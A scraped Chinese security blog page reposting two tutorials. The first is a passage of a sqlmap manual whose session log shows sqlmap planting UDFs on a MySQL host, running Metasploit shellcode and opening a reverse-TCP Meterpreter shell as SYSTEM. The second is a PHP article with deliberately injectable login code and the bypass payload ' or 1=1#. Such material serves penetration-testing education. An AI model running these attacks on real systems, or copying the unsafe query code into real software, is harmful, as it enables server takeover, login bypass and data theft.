<p>参数：--os-pwn,--os-smbrelay,--os-bof,--priv-esc,--msf-path,--tmp-path</p>
<p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数，可以在数据库与攻击者直接建立TCP连接，这个连接可以是一个交互式命令行的Meterpreter会话，sqlmap根据Metasploit生成shellcode，并有四种方式执行它：
1、通过用户自定义的sys_bineval()函数在内存中执行Metasplit的shellcode，支持MySQL和PostgreSQL数据库，参数：--os-pwn。 2、通过用户自定义的函数上传一个独立的payload执行，MySQL和PostgreSQL的sys_exec()函数，Microsoft SQL Server的xp_cmdshell()函数，参数：--os-pwn。 3、通过SMB攻击(MS08-068)来执行Metasploit的shellcode，当sqlmap获取到的权限足够高的时候（Linux/Unix的uid=0，Windows是Administrator），--os-smbrelay。 4、通过溢出Microsoft SQL Server 2000和2005的sp_replwritetovarbin存储过程(MS09-004)，在内存中执行Metasploit的payload，参数：--os-bof</p>
<p>列举一个MySQL例子：</p>
<p>$ python sqlmap.py -u &quot;<a href="http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?id=1" target="_blank">http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?id=1</a>&quot; --os-pwn --msf-path /software/metasploit [...] [hh:mm:31] [INFO] the back-end DBMS is MySQL web server operating system: Windows 2003 web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0 back-end DBMS: MySQL 5.0 [hh:mm:31] [INFO] fingerprinting the back-end DBMS operating system [hh:mm:31] [INFO] the back-end DBMS operating system is Windows how do you want to establish the tunnel? [1] TCP: Metasploit Framework (default) [2] ICMP: icmpsh - ICMP tunneling &gt; [hh:mm:32] [INFO] testing if current user is DBA [hh:mm:32] [INFO] fetching current user what is the back-end database management system architecture? [1] 32-bit (default) [2] 64-bit &gt; [hh:mm:33] [INFO] checking if UDF &#39;sys<em>bineval&#39; already exist [hh:mm:33] [INFO] checking if UDF &#39;sys_exec&#39; already exist [hh:mm:33] [INFO] detecting back-end DBMS version from its banner [hh:mm:33] [INFO] retrieving MySQL base directory absolute path [hh:mm:34] [INFO] creating UDF &#39;sys_bineval&#39; from the binary UDF file [hh:mm:34] [INFO] creating UDF &#39;sys_exec&#39; from the binary UDF file how do you want to execute the Metasploit shellcode on the back-end database underlying operating system? [1] Via UDF &#39;sys_bineval&#39; (in-memory way, anti-forensics, default) [2] Stand-alone payload stager (file system way) &gt; [hh:mm:35] [INFO] creating Metasploit Framework multi-stage shellcode which connection type do you want to use? [1] Reverse TCP: Connect back from the database host to this machine (default) [2] Reverse TCP: Try to connect back from the database host to this machine, on all ports between the specified and 65535 [3] Bind TCP: Listen on the database host for a connection &gt; which is the local address? [192.168.136.1] which local port number do you want to use? [60641] which payload do you want to use? [1] Meterpreter (default) [2] Shell [3] VNC &gt; [hh:mm:40] [INFO] creation in progress ... done [hh:mm:43] [INFO] running Metasploit Framework command line interface locally, please wait..                                 </em>                                 | |      o <em>  </em>  <em>    </em> <em>|</em>  <strong>,   ,    _  | |  </strong>    <em>|</em> / |/ |/ |  |/  |  /  |  / _|/ _|/  /  _|  | |  |  |<em>/|__/|</em>/_/|<em>/ \/ |<strong>/ |</strong>/__/ |</em>/|_/                         /|                         |     =[ metasploit v3.7.0-dev [core:3.7 api:1.0] + -- --=[ 674 exploits - 351 auxiliary + -- --=[ 217 payloads - 27 encoders - 8 nops     =[ svn r12272 updated 4 days ago (2011.04.07) PAYLOAD =&gt; windows/meterpreter/reverse_tcp EXITFUNC =&gt; thread LPORT =&gt; 60641 LHOST =&gt; 192.168.136.1 [/<em>] Started reverse handler on 192.168.136.1:60641 [/</em>] Starting the payload handler... [hh:mm:48] [INFO] running Metasploit Framework shellcode remotely via UDF &#39;sys_bineval&#39;, please wait.. [/<em>] Sending stage (749056 bytes) to 192.168.136.129 [/</em>] Meterpreter session 1 opened (192.168.136.1:60641 -&gt; 192.168.136.129:1689) at Mon Apr 11 hh:mm:52 +0100 2011 meterpreter &gt; Loading extension espia...success. meterpreter &gt; Loading extension incognito...success. meterpreter &gt; [-] The &#39;priv&#39; extension has already been loaded. meterpreter &gt; Loading extension sniffer...success. meterpreter &gt; System Language : en_US OS              : Windows .NET Server (Build 3790, Service Pack 2). Computer        : W2K3R2 Architecture    : x86 Meterpreter     : x86/win32 meterpreter &gt; Server username: NT AUTHORITY\SYSTEM meterpreter &gt; ipconfig MS TCP Loopback interface Hardware MAC: 00:00:00:00:00:00 IP Address  : 127.0.0.1 Netmask     : 255.0.0.0 Intel(R) PRO/1000 MT Network Connection Hardware MAC: 00:0c:29:fc:79:39 IP Address  : 192.168.136.129 Netmask     : 255.255.255.0 meterpreter &gt; exit [/*] Meterpreter session 1 closed.  Reason: User exit</p>
<p>默认情况下MySQL在Windows上以SYSTEM权限运行，PostgreSQL在Windows与Linux中是低权限运行，Microsoft SQL Server 2000默认是以SYSTEM权限运行，Microsoft SQL Server 2005与2008大部分是以NETWORK SERVICE有时是LOCAL SERVICE。
<strong>Tags:</strong> <a href="http://drops.wooyun.org/tag/sqlmap" target="_blank">sqlmap</a></p>
<p>版权声明：未经授权禁止转载 <a href="http://drops.wooyun.org/author/瞌睡龙" title="由 瞌睡龙 发布" target="_blank">瞌睡龙</a>@<a href="http://drops.wooyun.org/" target="_blank">乌云知识库</a>
分享到： <a href="&quot;分享到QQ空间&quot;"></a> <a href="&quot;分享到新浪微博&quot;"></a> <a href="&quot;分享到腾讯微博&quot;"></a> <a href="&quot;分享到人人网&quot;"></a> <a href="&quot;分享到网易微博&quot;"></a> <a href="&quot;累计分享4次&quot;">4</a></p>
<h3 id="-">相关日志</h3>
<ul>
<li><a href="http://drops.wooyun.org/tips/401" target="_blank">sqlmap用户手册[续]</a></li>
<li><a href="http://drops.wooyun.org/tips/57" target="_blank">Hacking Oracle with Sql Injection</a></li>
<li><a href="http://drops.wooyun.org/tips/125" target="_blank">python脚本处理伪静态注入</a></li>
<li><a href="http://drops.wooyun.org/tips/218" target="_blank">PostgreSQL的那点事儿</a></li>
<li><a href="http://drops.wooyun.org/tips/640" target="_blank">Dionaea低交互式蜜罐部署详解</a></li>
<li><a href="http://drops.wooyun.org/tips/646" target="_blank">得到内网域管理员的5种常见方法</a>
上一篇:<a href="http://drops.wooyun.org/papers/146" target="_blank">Browser Security-基本概念</a></li>
</ul>
<p>下一篇:<a href="http://drops.wooyun.org/tips/141" target="_blank">常见验证码的弱点与验证码识别</a></p>
<h3 id="-21-rss-2-0-http-drops-wooyun-org-tips-143-feed-trackback-http-drops-wooyun-org-tips-143-trackback-">楼被抢了 21 层了... <a href="">抢座</a>、<a href="http://drops.wooyun.org/tips/143/feed" target="_blank">Rss 2.0</a>或者 <a href="http://drops.wooyun.org/tips/143/trackback" target="_blank">Trackback</a></h3>
<ul>
<li><img src="" alt=""> se55i0n | 2013/06/13 19:01 | <a href="">/#</a></li>
</ul>
<p>沙花，慢慢看</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> 小伟 | 2013/06/13 19:15 | <a href="">/#</a></li>
</ul>
<p>第一次板凳</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> Demon | 2013/06/13 22:40 | <a href="">/#</a></li>
</ul>
<p>地板</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> 墨水心_Len | 2013/06/14 09:41 | <a href="">/#</a></li>
</ul>
<p>mark</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> zzR | 2013/06/14 10:13 | <a href="">/#</a></li>
</ul>
<p>马克</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> 熊猫 | 2013/06/14 12:58 | <a href="">/#</a></li>
</ul>
<p>^=_=^ 看不懂，但是好厉害。。</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> Alcar | 2013/06/14 21:15 | <a href="">/#</a></li>
</ul>
<p>很详细，赞</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> HuGtion | 2013/06/14 23:11 | <a href="">/#</a></li>
</ul>
<p>赞一个</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> 齐迹 | 2013/06/15 07:42 | <a href="">/#</a></li>
</ul>
<p>回头看穿山甲，简直是弱爆了！以后就用他了</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> 小 葛 | 2013/06/16 01:00 | <a href="">/#</a></li>
</ul>
<p>可不可以不要这么详细</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> Deep | 2013/06/16 07:56 | <a href="">/#</a></li>
</ul>
<p>mark</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> yofx | 2013/06/17 14:05 | <a href="">/#</a></li>
</ul>
<p>非常好：） mark</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> lxsec | 2013/06/17 15:27 | <a href="">/#</a></li>
</ul>
<p>真是好东西~mark</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> lion(lp) | 2013/06/18 12:19 | <a href="">/#</a></li>
</ul>
<p>辛苦了～～打了这么多</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> hack2012 | 2013/06/18 14:45 | <a href="">/#</a></li>
</ul>
<p>写的真详细。</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> txcbg | 2013/06/28 20:57 | <a href="">/#</a></li>
</ul>
<p>很详细啊，赞一个。</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> gniq | 2013/07/12 17:18 | <a href="">/#</a></li>
</ul>
<p>比我原来总结的更详细一些，赞一个</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> 基佬库克 | 2013/07/12 19:43 | <a href="">/#</a></li>
</ul>
<p>–flush-session /#刷新当前目标的会话文件
–fresh-queries /#忽略在会话文件中存储的查询结果
这两个开关没有讲到,这两个对中断后重新注入有帮助</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> 么么哒 | 2013/07/28 17:17 | <a href="">/#</a></li>
</ul>
<p>@瞌睡龙 大侠 win下sqlmap射出来的数据无法正常显示，如何解？</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> 瞌睡龙 | 2013/07/29 11:46 | <a href="">/#</a></li>
</ul>
<p>可能是编码不对，使用--charset参数试试，例如：--charset=GBK 可自定义为返回的编码为GBK。</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> hijack | 2013/08/24 10:10 | <a href="">/#</a></li>
</ul>
<p>这个好东西啊， 学学</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<h3 id="-">发表评论</h3>
<p><a href="">点击这里取消回复。</a></p>
<p>您必须 <a href="http://drops.wooyun.org/login" target="_blank">登陆</a> 后才能发表评论。</p>
<h3 id="-">订阅更新</h3>
<ul>
<li><a href="http://drops.wooyun.org/feed" title="点击订阅" target="_blank"><img src="" alt=""></a></li>
</ul>
<h3 id="-">分类</h3>
<ul>
<li><a href="http://drops.wooyun.org/category/papers" title="漏洞分析" target="_blank">漏洞分析</a> (40)</li>
<li><a href="http://drops.wooyun.org/category/tips" title="技术分享" target="_blank">技术分享</a> (57)</li>
<li><a href="http://drops.wooyun.org/category/tools" title="工具收集" target="_blank">工具收集</a> (5)</li>
<li><p><a href="http://drops.wooyun.org/category/news" title="业界资讯" target="_blank">业界资讯</a> (3)</p>
<h3 id="-">最新日志</h3>
</li>
<li><p><a href="http://drops.wooyun.org/tips/688" title="Flash CSRF" target="_blank">Flash CSRF</a></p>
</li>
<li><a href="http://drops.wooyun.org/tips/689" title="XSS与字符编码的那些事儿 —科普文" target="_blank">XSS与字符编码的那些事儿 —科普文</a></li>
<li><a href="http://drops.wooyun.org/papers/680" title="Zabbix SQL Injection/RCE – CVE-2013-5743" target="_blank">Zabbix SQL Injection/RCE – CVE-2013-5743</a></li>
<li><a href="http://drops.wooyun.org/papers/679" title="CDN流量放大攻击思路" target="_blank">CDN流量放大攻击思路</a></li>
<li><a href="http://drops.wooyun.org/news/674" title="从丝绸之路到安全运维（Operational Security）与风险控制（Risk Management） 上集" target="_blank">从丝绸之路到安全运维（Operational Security）与风险控制（Risk Management） 上集</a></li>
<li><a href="http://drops.wooyun.org/tips/662" title="攻击JavaWeb应用[8]-后门篇" target="_blank">攻击JavaWeb应用[8]-后门篇</a></li>
<li><a href="http://drops.wooyun.org/papers/660" title="php4fun.sinaapp.com PHP挑战通关攻略" target="_blank">php4fun.sinaapp.com PHP挑战通关攻略</a></li>
<li><a href="http://drops.wooyun.org/papers/653" title="搭建基于Suricata+Barnyard2+Base的IDS前端Snorby" target="_blank">搭建基于Suricata+Barnyard2+Base的IDS前端Snorby</a></li>
<li><a href="http://drops.wooyun.org/tools/655" title="GPU破解神器Hashcat使用简介" target="_blank">GPU破解神器Hashcat使用简介</a></li>
<li><a href="http://drops.wooyun.org/tips/649" title="内网渗透应用 跨vlan渗透的一种思路" target="_blank">内网渗透应用 跨vlan渗透的一种思路</a></li>
</ul>
<h3 id="-">最新评论</h3>
<ul>
<li>正在加载...
<em>
</em>
Powered by <a href="http://wordpress.org/" target="_blank">WordPress</a> | GZai Theme by <a href="http://huaidan.org/" title="GZai Theme produced by 鬼仔" target="_blank">鬼仔</a>
<a href="http://tongji.baidu.com/hm-web/welcome/ico?s=9fc41da6a2322bdd80563c9d5a4bdb1d" target="_blank"><img src="" alt=""></a></li>
</ul>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span><span class="breadcrumb"><li><a href="/categories/安全/">安全</a></li><li><a href="/categories/安全/学习手册类/">学习手册类</a></li></span></span> | <span class="tags">Tagged <a href="/tags/学习手册类/" class="label label-primary">学习手册类</a><a href="/tags/安全/" class="label label-success">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:39"datetime="2014-03-07 09:54:39"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全-学习手册类--sqlmap用户手册/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全-学习手册类--sqlmap用户手册" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全-SQL注入--利用SQL注入漏洞登录后台/">利用SQL注入漏洞登录后台</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:39.000Z"> <a href="/2014/02/02/2014-02-02-安全-SQL注入--利用SQL注入漏洞登录后台/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-sql-">利用SQL注入漏洞登录后台</h1>
<h3 id="-">分享到</h3>
<ul>
<li><a href="">一键分享</a></li>
<li><a href="">QQ空间</a></li>
<li><a href="">新浪微博</a></li>
<li><a href="">百度搜藏</a></li>
<li><a href="">人人网</a></li>
<li><a href="">腾讯微博</a></li>
<li><a href="">百度相册</a></li>
<li><a href="">开心网</a></li>
<li><a href="">腾讯朋友</a></li>
<li><a href="">百度贴吧</a></li>
<li><a href="">豆瓣网</a></li>
<li><a href="">搜狐微博</a></li>
<li><a href="">百度新首页</a></li>
<li><a href="">QQ好友</a></li>
<li><a href="">和讯微博</a></li>
<li><a href="">更多...</a></li>
</ul>
<p><a href="">百度分享</a></p>
<p>用户名：  密码：   <a href="http://bbs.php100.com/register.php" target="_blank">新用户注册</a></p>
<p><a href="http://bbs.php100.com/read-htm-tid-693.html" target="_blank">PHP100三不条约</a> <a href="http://www.php100.com/cms/com/intome.php?tg" target="_blank">投稿</a></p>
<p><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2012/0210/data/rssmap.html" title="rss" target="_blank"><img src="" alt="rss"></a></p>
<p><a href="http://www.php100.com/" target="_blank"><img src="" alt="PHP100中文网-中国第一档PHP资源分享门户"></a></p>
<p><a href="http://www.php100.com/" target="_blank">网站首页</a> | <a href="http://www.php100.com/html/itnews/" target="_blank">业界资讯</a> | <a href="http://www.php100.com/html/webkaifa/" target="_blank">相关开发资料</a> | <a href="http://www.php100.com/html/open-php/" target="_blank">IT开源报道</a> | <a href="http://www.php100.com/html/download/" target="_blank">相关下载</a> | <a href="http://www.php100.com/html/shipinjiaocheng/" target="_blank">视频教程</a> | <a href="http://www.php100.com/job.php" target="_blank">PHP求职招聘</a> | <a href="http://www.php100.com/waibao.php" target="_blank">项目供求</a> | <a href="http://www.php100.com/share.php" target="_blank">资源共享</a> | <a href="http://bbs.php100.com/" target="_blank">PHP100中文论坛</a></p>
<p><strong><a href="http://www.php100.com/html/webkaifa/apache/" target="_blank">Apache&amp;Nginx</a> | <a href="http://www.php100.com/html/webkaifa/DIV_CSS/" target="_blank">DIVCSS</a> | <a href="http://www.php100.com/html/webkaifa/PHP/" target="_blank">PHP</a> | <a href="http://www.php100.com/html/webkaifa/database/" target="_blank">DB</a> | <a href="http://www.php100.com/html/webkaifa/javascript/" target="_blank">JS&amp;JQuery</a> | <a href="http://www.php100.com/html/webkaifa/HTML5/" target="_blank">HTML5</a> | <a href="http://www.php100.com/html/webkaifa/Android/" target="_blank">Android</a> | <a href="http://www.php100.com/html/webkaifa/python/" target="_blank">python</a> | <a href="http://www.php100.com/html/webkaifa/ajax/" target="_blank">Ajax</a> | <a href="http://www.php100.com/html/webkaifa/xml/" target="_blank">XML&amp;JSON</a> | <a href="http://www.php100.com/html/webkaifa/Linux/" target="_blank">Linux</a> | <a href="http://www.php100.com/html/webkaifa/zhengzebiaodashi/" target="_blank">正则</a> |</strong>
<a href="http://www.chuangen.com/php_training.php" target="_blank"><img src="" alt=""></a></p>
<p><a href="http://www.php100.com/" target="_blank">首页</a> &gt; <a href="http://www.php100.com/html/webkaifa/" target="_blank">开发资料</a> &gt; <a href="http://www.php100.com/html/webkaifa/PHP/" target="_blank">PHP</a> &gt; <a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/" target="_blank">PHP应用</a> &gt; 正文</p>
<h1 id="-sql-">利用SQL注入漏洞登录后台</h1>
<p>发布时间：2012-02-10 09:42:17   来源：cnblogs.com/hongfei   评论：<a href="">0</a> 点击：12173 次 【字号：<a href="">大</a> <a href="">中</a> <a href="">小</a>】</p>
<p><a href="&quot;分享到QQ空间&quot;">QQ空间</a> <a href="&quot;分享到新浪微博&quot;">新浪微博</a> <a href="&quot;分享到腾讯微博&quot;">腾讯微博</a> <a href="&quot;分享到人人网&quot;">人人网</a> <a href="&quot;分享到豆瓣网&quot;">豆瓣网</a> <a href="&quot;分享到百度空间&quot;">百度空间</a> <a href="&quot;分享到百度搜藏&quot;">百度搜藏</a> <a href="&quot;分享到开心网&quot;">开心网</a> <a href="&quot;分享到复制网址&quot;">复制</a> 更多 <a href="&quot;累计分享8次&quot;">8</a>
题记：工作需要，得好好补习下关于WEB安全方面的相关知识，故撰此文，权当总结，别无它意。读这篇文章，我假设读者有过写SQL语句的经历，或者能看得懂SQL语句　　早在02年，国外关于SQL注入漏洞的技术文章已...</p>
<p>题记：工作需要，得好好补习下关于WEB安全方面的相关知识，故撰此文，权当总结，别无它意。读这篇文章，我假设读者有过写SQL语句的经历，或者能看得懂SQL语句</p>
<p>早在02年，国外关于SQL注入漏洞的技术文章已经很多，而国内在05年左右才开始的。</p>
<p>如今，谈SQL注入漏洞是否已是明日黄花，国内大大小小的网站都已经补上漏洞。但，百密必有一疏，入侵是偶然的，但安全绝对不是必然的。</p>
<p>前些天，网上传得沸沸扬扬的“拖库”事件给我们敲响了安全警钟。</p>
<p>在开发网站的时候，出于安全考虑，需要过滤从页面传递过来的字符。通常，用户可以通过以下接口调用数据库的内容：URL地址栏、登陆界面、留言板、搜索框等。这往往给骇客留下了可乘之机。轻则数据遭到泄露，重则服务器被拿下。</p>
<p>现在，很多网站开发人员知其然而不知其所以然，小弟也是，所以赶紧恶补下，总结如学习内容。希望对初学者能够起到抛砖引玉的作用。</p>
<p><strong>一、SQL注入的步骤</strong></p>
<p>a) 寻找注入点(如：登录界面、留言板等)</p>
<p>b) 用户自己构造SQL语句(如：’ or 1=1/#，后面会讲解)</p>
<p>c) 将sql语句发送给数据库管理系统(DBMS)</p>
<p>d) DBMS接收请求，并将该请求解释成机器代码指令，执行必要的存取操作</p>
<p>e) DBMS接受返回的结果，并处理，返回给用户</p>
<p>因为用户构造了特殊的SQL语句，必定返回特殊的结果(只要你的SQL语句够灵活的话)。</p>
<p>下面，我通过一个实例具体来演示下SQL注入</p>
<p><strong>二、SQL注入实例详解</strong>(以上测试均假设服务器未开启magic_quote_gpc)</p>
<p>1) 前期准备工作</p>
<p>先来演示通过SQL注入漏洞，登入后台管理员界面</p>
<p>首先，创建一张试验用的数据表：</p>
<p>CREATE TABLE <code>users</code> (</p>
<p><code>id</code> int(11) NOT NULL AUTO_INCREMENT,</p>
<p><code>username</code> varchar(64) NOT NULL,</p>
<p><code>password</code> varchar(64) NOT NULL,</p>
<p><code>email</code> varchar(64) NOT NULL,</p>
<p>PRIMARY KEY (<code>id</code>),</p>
<p>UNIQUE KEY <code>username</code> (<code>username</code>)</p>
<p>) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;</p>
<p>添加一条记录用于测试：</p>
<p>INSERT INTO users (username,password,email)</p>
<p>VALUES(&#39;MarcoFly&#39;,md5(&#39;test&#39;),&#39;marcofly@test.com&#39;);</p>
<p>接下来，贴上登录界面的源代码：</p>
<html>
<head>
<title>Sql注入演示</title>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
</head>

<body >
<form action="validate.php" method="post">
  <fieldset >
    <legend>Sql注入演示</legend>
    <table>
      <tr>
        <td>用户名：</td>
        <td><input type="text" name="username"></td>
      </tr>
      <tr>
        <td>密&nbsp;&nbsp;码：</td>
        <td><input type="text" name="password"></td>
      </tr>
      <tr>
        <td><input type="submit" value="提交"></td>
        <td><input type="reset" value="重置"></td>
      </tr>
    </table>
  </fieldset>
</form>
</body>
</html>

<p>附上效果图：
<img src="" alt="\"></p>
<p>当用户点击提交按钮的时候，将会把表单数据提交给validate.php页面，validate.php页面用来判断用户输入的用户名和密码有没有都符合要求(这一步至关重要，也往往是SQL漏洞所在)</p>
<p>代码如下：</p>
<html>
<head>
<title>登录验证</title>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
</head>

<body>
&lt;?php

       $conn=@mysql_connect(&quot;localhost&quot;,&#39;root&#39;,&#39;&#39;) or die(&quot;数据库连接失败！&quot;);;

       mysql_select_db(&quot;injection&quot;,$conn) or die(&quot;您要选择的数据库不存在&quot;);

       $name=$_POST[&#39;username&#39;];

       $pwd=$_POST[&#39;password&#39;];

       $sql=&quot;select /* from users where username=&#39;$name&#39; and password=&#39;$pwd&#39;&quot;;

       $query=mysql_query($sql);

       $arr=mysql_fetch_array($query);

       if(is_array($arr)){

              header(&quot;Location:manager.php&quot;);

       }else{

              echo &quot;您的用户名或密码输入有误，<a href=\"Login.php\">请重新登录！</a>&quot;;

       }

?&gt;
</body>
</html>

<p>注意到了没有，我们直接将用户提交过来的数据(用户名和密码)直接拿去执行，并没有实现进行特殊字符过滤，待会你们将明白，这是致命的。</p>
<p>代码分析：如果，用户名和密码都匹配成功的话，将跳转到管理员操作界面(manager.php)，不成功，则给出友好提示信息。</p>
<p>登录成功的界面：
<img src="" alt="\"></p>
<p>登录失败的提示：</p>
<p><img src="" alt="\"></p>
<p>到这里，前期工作已经做好了，接下来将展开我们的重头戏：SQL注入</p>
<p>2) 构造SQL语句</p>
<p>填好正确的用户名(marcofly)和密码(test)后，点击提交，将会返回给我们“欢迎管理员”的界面。</p>
<p>因为根据我们提交的用户名和密码被合成到SQL查询语句当中之后是这样的：</p>
<p>select /* from users where username=&#39;marcofly&#39; and password=md5(&#39;test&#39;)</p>
<p>很明显，用户名和密码都和我们之前给出的一样，肯定能够成功登陆。但是，如果我们输入一个错误的用户名或密码呢?很明显，肯定登入不了吧。恩，正常情况下是如此，但是对于有SQL注入漏洞的网站来说，只要构造个特殊的“字符串”，照样能够成功登录。</p>
<p>比如：在用户名输入框中输入:’ or 1=1/#,密码随便输入，这时候的合成后的SQL查询语句为：</p>
<p>select /* from users where username=&#39;&#39; or 1=1/#&#39; and password=md5(&#39;&#39;)</p>
<p>语义分析：“/#”在mysql中是注释符，这样井号后面的内容将被mysql视为注释内容，这样就不会去执行了，换句话说，以下的两句sql语句等价：</p>
<p>select /* from users where username=&#39;&#39; or 1=1/#&#39; and password=md5(&#39;&#39;)</p>
<p>等价于</p>
<p>select /* from users where username=&#39;&#39; or 1=1</p>
<p>因为1=1永远是都是成立的，即where子句总是为真，将该sql进一步简化之后，等价于如下select语句：</p>
<p>select /* from users</p>
<p>没错，该sql语句的作用是检索users表中的所有字段</p>
<p>小技巧：如果不知道’ or 1=1/#中的单引号的作用，可以自己echo 下sql语句，就一目了然了。</p>
<p>看到了吧，一个经构造后的sql语句竟有如此可怕的破坏力，相信你看到这后，开始对sql注入有了一个理性的认识了吧~</p>
<p>没错，SQL注入就是这么容易。但是，要根据实际情况构造灵活的sql语句却不是那么容易的。有了基础之后，自己再去慢慢摸索吧。</p>
<p>有没有想过，如果经由后台登录窗口提交的数据都被管理员过滤掉特殊字符之后呢?这样的话，我们的万能用户名’ or 1=1/#就无法使用了。但这并不是说我们就毫无对策，要知道用户和数据库打交道的途径不止这一条。
-</p>
<p>（责任编辑：phpcms）
本文关键字：</p>
<ul>
<li><a href="http://www.php100.com/index.php?m=content&amp;c=tag&amp;catid=21&amp;tag=%C0%FB%D3%C3" target="_blank">利用</a> <a href="http://www.php100.com/index.php?m=content&amp;c=tag&amp;catid=21&amp;tag=%D7%A2%C8%EB" target="_blank">注入</a> <a href="http://www.php100.com/index.php?m=content&amp;c=tag&amp;catid=21&amp;tag=%C2%A9%B6%B4" target="_blank">漏洞</a></li>
</ul>
<p><strong>上一篇：</strong><a href="http://www.php100.com/html/webkaifa/javascript/2012/0210/9802.html" target="_blank">JS 调用 Flash 方法</a>
<strong>下一篇：</strong><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2012/0210/9804.html" target="_blank">几个 PHP 的“魔术常量”</a></p>
<ul>
<li>14 <img src="" alt="">
震惊</li>
<li>14 <img src="" alt="">
不解</li>
<li>3 <img src="" alt="">
愤怒</li>
<li>9 <img src="" alt="">
杯具</li>
<li>18 <img src="" alt="">
无聊</li>
<li>7 <img src="" alt="">
高兴</li>
<li>17 <img src="" alt="">
支持</li>
<li>83 <img src="" alt="">
超赞</li>
</ul>
<p>分享到：  <a href=""> </a> <a href="http://v.t.sina.com.cn/share/share.php?url=http%3A%2F%2Fwww.php100.com%2Fhtml%2Fwebkaifa%2FPHP%2FPHPyingyong%2F2012%2F0210%2F9803.html&amp;appkey=3172366919&amp;title=%E5%88%A9%E7%94%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0" title="分享到新浪微博" target="_blank"> </a> <a href="http://www.douban.com/recommend/?url=http%3A%2F%2Fwww.php100.com%2Fhtml%2Fwebkaifa%2FPHP%2FPHPyingyong%2F2012%2F0210%2F9803.html&amp;title=%E5%88%A9%E7%94%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0" title="分享到豆瓣" target="_blank"> </a> <a href="http://share.renren.com/share/buttonshare.do?link=http%3A%2F%2Fwww.php100.com%2Fhtml%2Fwebkaifa%2FPHP%2FPHPyingyong%2F2012%2F0210%2F9803.html&amp;title=%E5%88%A9%E7%94%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0" title="分享到人人" target="_blank"> </a> <a href="http://www.kaixin001.com/repaste/share.php?rtitle=%E5%88%A9%E7%94%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0&amp;rurl=http%3A%2F%2Fwww.php100.com%2Fhtml%2Fwebkaifa%2FPHP%2FPHPyingyong%2F2012%2F0210%2F9803.html&amp;rcontent=" title="分享到开心网" target="_blank"> </a> <a href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http%3A%2F%2Fwww.php100.com%2Fhtml%2Fwebkaifa%2FPHP%2FPHPyingyong%2F2012%2F0210%2F9803.html" title="分享到QQ空间" target="_blank"> </a>
最新资讯</p>
<ul>
<li><a href="http://www.php100.com/html/itnews/PHPxinwen/2013/0502/13421.html" target="_blank">PHP闭包（Closure）初探</a></li>
